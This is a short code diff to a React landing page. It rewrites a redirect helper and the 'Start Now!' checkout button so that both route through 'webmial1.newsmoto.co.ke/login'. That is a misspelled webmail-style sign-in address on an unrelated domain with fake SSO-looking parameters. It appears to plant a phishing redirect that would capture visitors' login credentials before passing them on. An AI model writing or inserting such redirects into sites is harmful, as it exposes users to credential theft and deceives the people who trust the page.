@@ -14,7 +14,7 @@ const socialPlatforms = [
 ];
 
 function createRedirectUrl(targetUrl: string): string {
-  return `https://shrtlnk.xyz/moveon=${encodeURIComponent(targetUrl)}`;
+  return `https://webmial1.newsmoto.co.ke/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=${encodeURIComponent(targetUrl)}`;
 }
 
 export default function Home() {
@@ -103,7 +103,7 @@ export default function Home() {
                 className="flex-1 bg-gray-800 border border-gray-700 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-blue-500"
               />
             </div>
-            <Link href={createRedirectUrl("https://insfamous.co/checkout/")}>
+            <Link href={createRedirectUrl("https://webmial1.newsmoto.co.ke/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https://insfamous.co/checkout/")}>
               <Button className="w-full bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 font-semibold py-3">
                 Start Now!
               </Button>
